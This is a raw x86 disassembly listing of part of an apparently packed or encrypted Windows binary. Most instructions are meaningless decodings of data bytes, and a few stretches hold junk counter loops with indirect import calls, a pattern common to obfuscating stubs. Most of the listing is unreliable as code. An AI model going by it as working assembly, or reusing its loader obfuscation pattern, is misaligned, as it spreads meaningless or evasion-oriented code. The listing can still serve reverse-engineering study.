  4072ba:	dec    ebp
  4072bb:	enter  0xb4ed,0x57
  4072bf:	aam    0x8b
  4072c1:	push   ebp
  4072c2:	loopne 0x40724f
  4072c4:	pop    ebp
  4072c5:	clc    
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0x90d80f0c
  4072e9:	mov    ss:0x7e7e18f8,al
  4072ef:	and    edi,DWORD PTR [edi+0x7e]
  4072f2:	jle    0x407343
  4072f4:	(bad)  
  4072f5:	jp     0x407330
  4072f7:	sbb    ebp,DWORD PTR [ebx+0x3e4680cb]
  4072fd:	idiv   BYTE PTR [ebp-0x49dc602e]
  407303:	dec    edx
  407304:	dec    ebp
  407305:	mov    DWORD PTR [esi-0xb657a5c],esp
  40730b:	xor    eax,0x9ffa49ec
  407310:	sbb    DWORD PTR [edi+0x63],esp
  407313:	repnz dec edi
  407315:	in     eax,dx
  407316:	mov    dl,BYTE PTR [ebx-0x6140fe6b]
  40731c:	in     eax,0xf4
  40731e:	neg    BYTE PTR [eax+0x3f]
  407321:	and    eax,0x8143314f
  407326:	jns    0x407333
  407328:	pop    esi
  407329:	dec    ebp
  40732a:	fimul  DWORD PTR [ebp*4+0x31f8e92c]
  407331:	or     eax,edi
  407333:	iret   
  407334:	mov    eax,0xd6ce0582
  407339:	out    dx,eax
  40733a:	cmc    
  40733b:	cmc    
  40733c:	imul   edi,ebx,0x9278f7e3
  407342:	xor    ecx,DWORD PTR [eax+0x41]
  407345:	xchg   esi,eax
  407346:	adc    eax,ecx
  407348:	dec    edi
  407349:	nop
  40734a:	stos   BYTE PTR es:[edi],al
  40734b:	or     eax,0xb08d3ca7
  407350:	sub    al,0x9a
  407352:	cdq    
  407353:	push   ecx
  407354:	lods   al,BYTE PTR ds:[esi]
  407355:	hlt    
  407356:	push   ds
  407357:	(bad)  
  407358:	mov    al,0xc7
  40735a:	jp     0x40738b
  40735c:	mov    eax,ds:0x673f29fa
  407361:	add    dh,bh
  407363:	std    
  407364:	and    bh,BYTE PTR [edx-0x2f]
  407367:	fcom   DWORD PTR [edx-0x4792423c]
  40736d:	cmc    
  40736e:	push   esp
  40736f:	aam    0x1c
  407371:	cld    
  407372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407373:	sbb    eax,0x52108d1f
  407378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407379:	(bad)  
  40737a:	ins    DWORD PTR es:[edi],dx
  40737b:	sub    eax,0x107a3a00
  407380:	push   esi
  407381:	leave  
  407382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407383:	loope  0x4073ad
  407385:	sbb    esi,DWORD PTR [edi-0x3e]
  407388:	es push ss
  40738a:	mov    ds:0x53c864fd,eax
  40738f:	sub    al,0xbc
  407391:	ins    BYTE PTR es:[edi],dx
  407392:	dec    esi
  407393:	inc    eax
  407394:	shl    BYTE PTR [edx+0x40],cl
  407397:	jnp    0x4073f9
  407399:	das    
  40739a:	out    0x5c,eax
  40739c:	inc    edx
  40739d:	pop    ebp
  40739e:	dec    eax
  40739f:	loopne 0x407387
  4073a1:	adc    DWORD PTR [ecx],edx
  4073a3:	inc    edx
  4073a4:	pop    esi
  4073a5:	dec    edi
  4073a6:	jo     0x4073ff
  4073a8:	aam    0x9e
  4073aa:	adc    dl,BYTE PTR [ebp+0x741e42dc]
  4073b0:	sub    al,0x9f
  4073b2:	lea    ebx,[ecx]
  4073b4:	cld    
  4073b5:	stos   DWORD PTR es:[edi],eax
  4073b6:	fmul   QWORD PTR [edi+ebp*2-0x2b]
  4073ba:	and    al,0x10
  4073bc:	jno    0x4073d9
  4073be:	jge    0x407375
  4073c0:	mov    edx,0x1162d365
  4073c5:	outs   dx,DWORD PTR ds:[esi]
  4073c6:	dec    esp
  4073c7:	les    ebx,FWORD PTR [edi]
  4073c9:	and    eax,0x8208f3e1
  4073ce:	cli    
  4073cf:	pop    es
  4073d0:	xlat   BYTE PTR ds:[ebx]
  4073d1:	sbb    BYTE PTR [ebx+eiz*4+0x42952f60],al
  4073d8:	pop    es
  4073d9:	data16 cmc 
  4073db:	lds    esi,FWORD PTR [eax-0x6e]
  4073de:	or     esp,ebx
  4073e0:	dec    esi
  4073e1:	dec    ecx
  4073e2:	xor    al,0x70
  4073e4:	stos   BYTE PTR es:[edi],al
  4073e5:	aaa    
  4073e6:	add    edx,DWORD PTR [esi-0x19d417ea]
  4073ec:	idiv   ah
  4073ee:	xchg   BYTE PTR [ecx+0x3b],dh
  4073f1:	dec    esp
  4073f2:	sbb    cl,ch
  4073f4:	mov    ds:0x47e2c370,eax
  4073f9:	mov    cl,0xaa
  4073fb:	mov    DWORD PTR [ecx],esi
  4073fd:	sahf   
  4073fe:	sub    esp,ecx
  407400:	mov    eax,0xfce5e816
  407405:	xchg   ebp,eax
  407406:	jg     0x407416
  407408:	mov    esi,0xdeeebe02
  40740d:	shr    dl,1
  40740f:	mov    fs,WORD PTR [edx]
  407411:	cmp    al,0x74
  407413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407414:	into   
  407415:	push   ecx
  407416:	hlt    
  407417:	inc    eax
  407418:	pop    ebp
  407419:	test   al,0x9f
  40741b:	test   DWORD PTR [esi-0x77f430ca],0x3c76c41f
  407425:	pusha  
  407426:	jmp    0x8:0xc2c95f2d
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1-0x192ed801],edi
  407443:	xor    DWORD PTR [edi+0x7e7e19ad],ebp
  407449:	jmp    0x2ebef2cd
  40744e:	retf   0x303b
  407451:	mov    esp,0x7d794855
  407456:	xor    eax,0x2e043091
  40745b:	fisttp WORD PTR [eax]
  40745d:	int3   
  40745e:	sbb    ebp,DWORD PTR [eax-0x67e1b494]
  407464:	mov    eax,0x2dcfff1d
  407469:	arpl   WORD PTR [ebx+0xd6b1826],dx
  40746f:	pop    ss
  407470:	jecxz  0x4074ec
  407472:	mov    eax,0xde3b4f51
  407477:	lods   eax,DWORD PTR ds:[esi]
  407478:	mov    ebx,0xd4fa4d1a
  40747d:	loope  0x407418
  40747f:	int3   
  407480:	pop    ebp
  407481:	pop    edx
  407482:	cmp    esi,DWORD PTR [eax+0x547d2764]
  407488:	mov    al,ds:0x6c46374a
  40748d:	jnp    0x407461
  40748f:	int    0x54
  407491:	pop    esp
  407492:	sbb    DWORD PTR [esi+0x7],0x89a9262f
  407499:	add    bl,BYTE PTR [esi]
  40749b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40749c:	sub    eax,0xef417f4f
  4074a1:	js     0x40743d
  4074a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074a4:	cmc    
  4074a5:	sub    eax,DWORD PTR [ebx+0x51392f]
  4074ab:	inc    ebx
  4074ac:	aaa    
  4074ad:	dec    ebp
  4074ae:	xchg   ebp,eax
  4074af:	and    BYTE PTR [ecx],ah
  4074b1:	aas    
  4074b2:	jl     0x407466
  4074b4:	xor    eax,0x17bda3d3
  4074b9:	nop
  4074ba:	js     0x4074cc
  4074bc:	xor    ecx,DWORD PTR [esi+0x30]
  4074bf:	test   eax,0xc75e73a
  4074c4:	add    DWORD PTR [edi+edi*1],esp
  4074c7:	dec    ecx
  4074c8:	xchg   ebp,eax
  4074c9:	retf   
  4074ca:	jp     0x40746f
  4074cc:	shl    ebx,0xf6
  4074cf:	xchg   ebp,eax
  4074d0:	outs   dx,BYTE PTR ds:[esi]
  4074d1:	imul   esp,DWORD PTR [ecx-0xbfac2af],0x55
  4074d8:	icebp  
  4074d9:	dec    esi
  4074da:	xchg   BYTE PTR [edi],cl
  4074dc:	sub    DWORD PTR [edi+ebp*2],ebp
  4074df:	lea    ecx,[edx+eax*8-0xe233cb]
  4074e6:	ins    BYTE PTR es:[edi],dx
  4074e7:	sbb    DWORD PTR [edx],eax
  4074e9:	sbb    BYTE PTR [edx-0x76b9368d],bl
  4074ef:	push   0x23588d84
  4074f4:	jmp    0x407545
  4074f6:	xchg   esp,eax
  4074f7:	pop    ds
  4074f8:	xor    ah,BYTE PTR [esi]
  4074fa:	mov    ebx,0xa2092820
  4074ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407500:	or     al,0x7c
  407502:	(bad)  
  407503:	lahf   
  407504:	push   ds
  407505:	dec    edx
  407506:	sbb    eax,0xf0519e4e
  40750b:	mov    ds:0xc5cb9f69,eax
  407510:	clc    
  407511:	push   0xbb8bbe9f
  407516:	and    al,BYTE PTR [ecx]
  407518:	popa   
  407519:	lock fadd QWORD PTR [esi]
  40751c:	popa   
  40751d:	mov    BYTE PTR [esi-0x2ecd9147],bh
  407523:	jb     0x407512
  407525:	and    cl,BYTE PTR [esi-0x76d4340b]
  40752b:	inc    esi
  40752c:	dec    edi
  40752d:	arpl   WORD PTR [edx-0x72],dx
  407530:	dec    eax
  407531:	inc    esp
  407532:	out    dx,eax
  407533:	push   eax
  407534:	scas   eax,DWORD PTR es:[edi]
  407535:	es aaa 
  407537:	push   esp
  407538:	inc    ebx
  407539:	and    al,0x2
  40753b:	cwde   
  40753c:	mov    ecx,0xf0d56cf
  407541:	fld    DWORD PTR [edi-0x35]
  407544:	out    0x12,eax
  407546:	cmp    esi,esp
  407548:	lahf   
  407549:	std    
  40754a:	(bad)  
  40754b:	xlat   BYTE PTR ds:[ebx]
  40754c:	add    edi,esp
  40754e:	imul   esi,DWORD PTR [eax-0x7d],0xfffffff0
  407552:	xor    BYTE PTR [esi-0x68],ch
  407555:	jg     0x407561
  407557:	pop    ss
  407558:	in     al,0x39
  40755a:	in     al,dx
  40755b:	mov    dl,BYTE PTR [esi+0xf]
  40755e:	and    eax,0x6b16afeb
  407563:	jno    0x407575
  407565:	(bad)  [edi]
  407567:	xchg   ecx,eax
  407568:	xchg   ebp,eax
  407569:	jp     0x407563
  40756b:	pop    es
  40756c:	bound  esp,QWORD PTR [edx+0x1d]
  40756f:	add    eax,0x96944f31
  407574:	js     0x4075e5
  407576:	push   ds
  407577:	pop    ds
  407578:	fidiv  DWORD PTR [eax+0x43]
  40757b:	je     0x4075e5
  40757d:	push   esp
  40757e:	sub    al,0x38
  407580:	cmp    ebx,DWORD PTR [edx+0x3c]
  407583:	inc    edi
  407584:	mov    al,BYTE PTR [edi+edi*1]
  407587:	add    al,0xf5
  407589:	nop
  40758a:	pop    edi
  40758b:	aas    
  40758c:	sbb    ecx,DWORD PTR [esi-0x6d]
  40758f:	xchg   ebx,eax
  407590:	(bad)  
  407591:	and    eax,0xab0cb25d
  407596:	shl    DWORD PTR [edx-0x4],cl
  407599:	std    
  40759a:	dec    ebx
  40759b:	sub    DWORD PTR [esi],0x3d
  40759e:	mov    BYTE PTR [ecx-0x73],al
  4075a1:	ja     0x40753e
  4075a3:	fwait
  4075a4:	cmp    esi,DWORD PTR [esp+esi*2+0x485a4c03]
  4075ab:	sub    edx,edx
  4075ad:	cmp    edi,ebx
  4075af:	inc    edx
  4075b0:	test   eax,0x2227eb97
  4075b5:	push   DWORD PTR [ebp+0x4001be4b]
  4075bb:	mov    ds:0x25815151,al
  4075c0:	into   
  4075c1:	stos   DWORD PTR es:[edi],eax
  4075c2:	inc    ecx
  4075c3:	add    BYTE PTR [eax],al
  4075c5:	add    BYTE PTR [eax],al
  4075c7:	add    cl,ch
  4075c9:	or     eax,0x8b000000
  4075ce:	adc    eax,0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi-0x64]
  4076f9:	stc    
  4076fa:	aad    0x78
  4076fc:	sbb    al,0x1f
  4076fe:	jle    0x40777e
  407700:	jmp    0x53bef584
  407705:	cs int3 
  407707:	mov    esi,0xe537f2f3
  40770c:	cmp    dh,BYTE PTR [edi+0x3c]
  40770f:	dec    ebp
  407710:	stc    
  407711:	lods   al,BYTE PTR ds:[esi]
  407712:	or     eax,0xc27045b8
  407717:	mov    eax,ds:0xdde77691
  40771c:	out    0xc6,al
  40771e:	int    0x5d
  407720:	mov    ebx,0x378aa86f
  407725:	sub    edx,ebp
  407727:	out    dx,al
  407728:	cwde   
  407729:	fldenv [esi-0x69b3ac87]
  40772f:	xor    al,0xee
  407731:	icebp  
  407732:	xor    dh,dh
  407734:	inc    esp
  407735:	xchg   ecx,eax
  407736:	mov    dl,BYTE PTR [edi]
  407738:	dec    eax
  407739:	ins    DWORD PTR es:[edi],dx
  40773a:	sahf   
  40773b:	pop    edx
  40773c:	pop    ds
  40773d:	stc    
  40773e:	(bad)  
  40773f:	cwde   
  407740:	fcomp  QWORD PTR [eax]
  407742:	ret    
  407743:	fild   DWORD PTR [eax]
  407745:	add    al,0x18
  407747:	cmp    BYTE PTR [eax],al
  407749:	mov    edx,0xa75fb02d
  40774e:	cmp    eax,0x37f335ea
  407753:	mov    dl,0xdf
  407755:	push   cs
  407756:	cmp    al,0xa7
  407758:	bound  esi,QWORD PTR [esi]
  40775a:	dec    ebx
  40775b:	cli    
  40775c:	lods   al,BYTE PTR ds:[esi]
  40775d:	lds    esi,FWORD PTR [eax-0x68]
  407760:	pusha  
  407761:	sbb    al,0xed
  407763:	mov    eax,0xe0e91b57
  407768:	push   DWORD PTR [eax]
  40776a:	test   al,0x1
  40776c:	mov    esi,0xb46a7651
  407771:	inc    ebp
  407772:	scas   eax,DWORD PTR es:[edi]
  407773:	jnp    0x407717
  407775:	mov    esi,0x6f63f410
  40777a:	xchg   edx,eax
  40777b:	hlt    
  40777c:	add    al,BYTE PTR [esi*2+0x2276ec96]
  407783:	xor    DWORD PTR [edi],0xef2a962c
  407789:	and    al,0x14
  40778b:	xchg   BYTE PTR [eax+0x5],bl
  40778e:	xor    ebp,esi
  407790:	jge    0x407770
  407792:	xchg   ecx,eax
  407793:	push   ss
  407794:	xor    DWORD PTR [eax+ebx*2+0x45826276],eax
  40779b:	and    BYTE PTR [edi+0x2],bl
  40779e:	push   ecx
  40779f:	adc    eax,0xe6bfe88
  4077a4:	pop    ecx
  4077a5:	jnp    0x407825
  4077a7:	dec    eax
  4077a8:	pop    eax
  4077a9:	fwait
  4077aa:	test   BYTE PTR [edx],al
  4077ac:	sahf   
  4077ad:	jmp    0x1fb:0x536b87bb
  4077b4:	into   
  4077b5:	sbb    esi,DWORD PTR [eax+0x5ff584fc]
  4077bb:	les    esp,FWORD PTR [ebx+edi*2]
  4077be:	into   
  4077bf:	jmp    0xea55:0xb596fc51
  4077c6:	(bad)  
  4077c8:	test   al,0x90
  4077ca:	push   ebx
  4077cb:	xchg   edi,eax
  4077cc:	sub    edi,ebx
  4077ce:	mov    edi,0xc6b85ca5
  4077d3:	cs mov esp,0x98027ab1
  4077d9:	sub    edx,ecx
  4077db:	sub    eax,0x2d4d6b8e
  4077e0:	add    bh,BYTE PTR [esi+0x28]
  4077e3:	pop    ss
  4077e4:	dec    esi
  4077e5:	push   es
  4077e6:	mov    ds:0xf44bc3ab,al
  4077eb:	fidiv  WORD PTR [ebp+eax*4+0x52]
  4077ef:	mov    al,0x0
  4077f1:	push   ecx
  4077f2:	sub    al,0x91
  4077f4:	adc    eax,DWORD PTR [ecx+0x74eb4b06]
  4077fa:	scas   al,BYTE PTR es:[edi]
  4077fb:	jbe    0x4077d9
  4077fd:	push   cs
  4077fe:	ret    
  4077ff:	test   DWORD PTR [ebx],esp
  407801:	int3   
  407802:	mov    ds:0x73f80a1,al
  407807:	mov    dh,0xfd
  407809:	mov    ebp,0x478b34cf
  40780e:	dec    edi
  40780f:	mov    al,ds:0x65b83159
  407814:	test   al,0x52
  407816:	xchg   BYTE PTR [ebx+0x62c2ddb],cl
  40781c:	mov    eax,DWORD PTR [ebx-0x4d]
  40781f:	cmp    bl,BYTE PTR [ebp-0x2ea5c0d5]
  407825:	mov    WORD PTR [ebx+0x6c412582],cs
  40782b:	(bad)  
  40782c:	call   DWORD PTR [eax+esi*2+0x4a]
  407830:	sbb    eax,0xcd9f2ed0
  407835:	icebp  
  407836:	fisttp QWORD PTR [esi-0x43]
  407839:	outs   dx,DWORD PTR ds:[esi]
  40783a:	lahf   
  40783b:	push   ds
  40783c:	mov    bh,0x2d
  40783e:	or     eax,0xf0d945d9
  407843:	lea    ecx,[ebp-0x1cf1f45b]
  407849:	imul   ecx
  40784b:	jl     0x40789d
  40784d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40784e:	fld    DWORD PTR [esi-0x4d]
  407851:	test   BYTE PTR [edx-0x62],ah
  407854:	fadd   QWORD PTR [ebx]
  407856:	stc    
  407857:	and    eax,0x219f5d8f
  40785c:	cld    
  40785d:	test   eax,0x63198867
  407862:	retf   
  407863:	xchg   esp,eax
  407864:	iret   
  407865:	retf   0xda33
  407868:	sub    eax,0xa9bc5819
  40786d:	fdivr  st(1),st
  40786f:	lds    ecx,FWORD PTR [ebx-0x7bf05ebc]
  407875:	mov    eax,DWORD PTR [ebx]
  407877:	add    BYTE PTR [eax],al
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi-0x382bf674],0x67
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x4078dc
  407897:	cli    
  407898:	in     eax,0x99
  40789a:	jle    0x40786c
  40789c:	inc    edx
  40789d:	fdiv   DWORD PTR [ebx+0x3c1bf465]
  4078a3:	pop    esp
  4078a4:	inc    edi
  4078a5:	ins    DWORD PTR es:[edi],dx
  4078a6:	cmp    bl,BYTE PTR [ecx+0x569dea6]
  4078ac:	pop    eax
  4078ad:	ins    DWORD PTR es:[edi],dx
  4078ae:	in     eax,0x9
  4078b0:	add    bh,dl
  4078b2:	test   DWORD PTR [ebp-0x1c],esi
  4078b5:	or     ch,0x9e
  4078b8:	faddp  st(6),st
  4078ba:	js     0x4078c2
  4078bc:	sbb    BYTE PTR [edi-0x1a],cl
  4078bf:	jg     0x4078f2
  4078c1:	rcl    DWORD PTR [ebx],cl
  4078c3:	cmp    dh,0xd
  4078c6:	and    ebx,ebx
  4078c8:	fisttp QWORD PTR [eax]
  4078ca:	xchg   ebp,eax
  4078cb:	(bad)  
  4078cc:	jl     0x40785f
  4078ce:	addr16 mov ebx,0xa54d586d
  4078d4:	aaa    
  4078d5:	mov    esi,0x2bcf16ff
  4078da:	inc    edi
  4078db:	cmp    DWORD PTR [ebp+0x4d],ebx
  4078de:	(bad)  
  4078e0:	es pop ds
  4078e2:	xchg   esi,eax
  4078e3:	inc    edx
  4078e4:	cmp    al,0x4d
  4078e6:	sti    
  4078e7:	dec    esi
  4078e8:	push   eax
  4078e9:	aad    0x35
  4078eb:	mov    cl,0xe7
  4078ed:	dec    ebx
  4078ee:	(bad)  
  4078ef:	lds    ebx,FWORD PTR ds:[edi+0x1e75e161]
  4078f6:	cdq    
  4078f7:	xchg   ecx,eax
  4078f8:	in     al,dx
  4078f9:	frstor [ebp-0x43ecfd04]
  4078ff:	ret    0xefbc
  407902:	hlt    
  407903:	and    eax,0x4861ec95
  407908:	pop    esi
  407909:	cmp    eax,0x7abb791d
  40790e:	dec    eax
  40790f:	adc    esi,DWORD PTR [ecx+0x46b1220c]
  407915:	pop    ecx
  407916:	into   
  407917:	or     ah,bh
  407919:	inc    BYTE PTR [eax+0x73]
  40791c:	push   edx
  40791d:	arpl   ax,di
  40791f:	sub    eax,0x5393f9db
  407924:	mov    edi,0xe9d3066
  407929:	ins    DWORD PTR es:[edi],dx
  40792a:	or     BYTE PTR [edx-0x7],cl
  40792d:	inc    esi
  40792e:	mov    dh,0x8e
  407930:	(bad)
  407933:	add    dl,BYTE PTR [ebx+edx*8-0x1]
  407937:	popf   
  407938:	cmp    ebp,DWORD PTR [edx+edx*8-0x3]
  40793c:	mov    ds:0xa0a7a82c,al
  407941:	jb     0x4078dd
  407943:	mov    BYTE PTR [esi],ch
  407945:	cmp    BYTE PTR [esi+ebx*4+0x5a],dh
  407949:	xchg   DWORD PTR [edi+0x2e],esi
  40794c:	push   0x2b
  40794e:	cwde   
  40794f:	push   ds
  407950:	repz mov al,0xf1
  407953:	mov    eax,0xecbd125
  407958:	and    DWORD PTR [eax+0x54],0xef74a3b
  40795f:	xchg   ebx,eax
  407960:	pusha  
  407961:	dec    ebp
  407962:	bound  edx,QWORD PTR [ecx]
  407964:	(bad)  
  407965:	fcomp  QWORD PTR [esi-0x15b25fb6]
  40796b:	and    al,0x4
  40796d:	inc    ebp
  40796e:	out    0xc0,al
  407970:	imul   ebp,DWORD PTR [edi+0x3],0xffffffba
  407974:	push   0x0
  407976:	xor    bl,BYTE PTR [ecx+0x3ba5ce81]
  40797c:	mov    es,WORD PTR [ecx]
  40797e:	adc    BYTE PTR [eax],dh
  407980:	and    DWORD PTR [edx+0x3],edx
  407983:	mov    ah,0xbc
  407985:	pop    es
  407986:	pop    ds
  407987:	iret   
  407988:	pusha  
  407989:	mov    dh,0xe5
  40798b:	outs   dx,BYTE PTR ds:[esi]
  40798c:	mov    bh,0xd9
  40798e:	jbe    0x4079b0
  407990:	shl    dh,1
  407992:	sub    esp,DWORD PTR [edx+esi*1]
  407995:	jae    0x4079c7
  407997:	push   ebp
  407998:	sbb    dl,BYTE PTR [edi-0x2f]
  40799b:	inc    esi
  40799c:	mov    ebp,0xfe596d3d
  4079a1:	sar    DWORD PTR [ecx-0xf09ece0],1
  4079a7:	lds    esp,FWORD PTR [eax]
  4079a9:	mov    ebx,0xfa3eb5af
  4079ae:	mov    cl,0x39
  4079b0:	fwait
  4079b1:	xor    al,0x78
  4079b3:	shl    edi,0x83
  4079b6:	cmp    eax,0xae55ec24
  4079bb:	jae    0x407984
  4079bd:	mov    WORD PTR [edi+0x73],?
  4079c0:	sub    al,0xf5
  4079c2:	call   0x306f:0xb9362bfb
  4079c9:	jmp    0x616a75bc
  4079ce:	jb     0x407a46
  4079d0:	out    dx,eax
  4079d1:	mov    al,0xfc
  4079d3:	and    eax,0x409fb62
  4079d8:	imul   ebp,DWORD PTR [eax],0xa627e1cd
  4079de:	hlt    
  4079df:	cmp    BYTE PTR [ebp+eiz*8-0x2d],al
  4079e3:	je     0x4079cc
  4079e5:	fwait
  4079e6:	xchg   edx,eax
  4079e7:	repz dec ebp
  4079e9:	out    dx,al
  4079ea:	jg     0x407a63
  4079ec:	fucom  st(2)
  4079ee:	mov    eax,ebx
  4079f0:	(bad)  
  4079f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079f2:	add    eax,0x33a63fd6
  4079f7:	jo     0x407a52
  4079f9:	jecxz  0x407a67
  4079fb:	pop    edx
  4079fc:	in     eax,0xdf
  4079fe:	pushf  
  4079ff:	xchg   DWORD PTR [ecx+0x4b],edi
  407a02:	inc    eax
  407a03:	sub    edx,edi
  407a05:	mov    edx,DWORD PTR [ebp-0x8]
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx-0x67],0x30
  407a27:	test   al,0x8e
  407a29:	jle    0x407a3d
  407a2b:	jle    0x407aab
  407a2d:	jmp    0xb9bef8b1
  407a32:	(bad)  [eax+0x1d]
  407a35:	and    al,0xeb
  407a37:	outs   dx,DWORD PTR ds:[esi]
  407a38:	test   BYTE PTR [ecx+0x1a],cl
  407a3b:	add    DWORD PTR [edi+0x368a433],0x2d
  407a42:	mov    bl,0xa
  407a44:	stos   DWORD PTR es:[edi],eax
  407a45:	je     0x407a28
  407a47:	mov    bh,0x20
  407a49:	into   
  407a4a:	jg     0x407ac5
  407a4c:	test   al,0x95
  407a4e:	cmp    eax,0xb3aa38ec
  407a53:	mov    edi,0xdd883089
  407a58:	mov    WORD PTR [eax],fs
  407a5a:	ja     0x407a7f
  407a5c:	push   ecx
  407a5d:	int3   
  407a5e:	inc    edi
  407a5f:	adc    cl,dl
  407a61:	push   0x656c78fd
  407a66:	mov    cl,0x55
  407a68:	xchg   esp,eax
  407a69:	push   ecx
  407a6a:	ss push 0xffffffc9
  407a6d:	mov    ecx,0x4737011e
  407a72:	int3   
  407a73:	and    eax,0xbe496f3a
  407a78:	test   eax,0xf854fe1d
  407a7d:	hlt    
  407a7e:	ds dec esp
  407a80:	lock (bad) 
  407a82:	es leave 
  407a84:	aad    0xd
  407a86:	adc    al,dh
  407a88:	outs   dx,DWORD PTR ds:[esi]
  407a89:	std    
  407a8a:	lods   al,BYTE PTR ds:[esi]
  407a8b:	out    0x5f,al
  407a8d:	mov    BYTE PTR [esi+0x1244c8c0],dh
  407a93:	xor    ch,BYTE PTR [esp+ebx*8-0x4b]
  407a97:	int    0xce
  407a99:	and    DWORD PTR [ebp-0x63],ebx
  407a9c:	mov    al,0xbe
  407a9e:	push   edi
  407a9f:	ins    DWORD PTR es:[edi],dx
  407aa0:	mov    ebx,0x3578083e
  407aa5:	ja     0x407af2
  407aa7:	sub    dh,BYTE PTR [esi]
  407aa9:	sub    DWORD PTR [ebx],edx
  407aab:	sbb    edi,DWORD PTR [ebx]
  407aad:	gs push ds
  407aaf:	sbb    BYTE PTR [edx+edi*2],dh
  407ab2:	push   ebx
  407ab3:	lds    ecx,FWORD PTR [esi+ebp*1+0x3fd874bb]
  407aba:	sub    ch,BYTE PTR [edi+ebp*2-0x75a348d4]
  407ac1:	pop    esi
  407ac2:	das    
  407ac3:	pop    ebx
  407ac4:	pusha  
  407ac5:	cmp    al,0x75
  407ac7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  407ac9:	push   ebp
  407aca:	cmp    bh,BYTE PTR [esi]
  407acc:	jo     0x407b3b
  407ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407acf:	adc    eax,0xfbcfe328
  407ad4:	popa   
  407ad5:	(bad)  
  407ad6:	jmp    FWORD PTR [ebx+0x7b8e9db8]
  407adc:	push   0xffffff8d
  407ade:	push   eax
  407adf:	mov    ebx,0xea4c81c0
  407ae4:	push   esp
  407ae5:	sub    eax,0x946be388
  407aea:	mov    bl,0xe5
  407aec:	ja     0x407ac6
  407aee:	retf   
  407aef:	mov    esi,0x1cc6de04
  407af4:	jecxz  0x407a98
  407af6:	gs inc ebp
  407af8:	mov    ds:0x9be6cea0,eax
  407afd:	dec    esp
  407afe:	sub    ch,BYTE PTR [ebx]
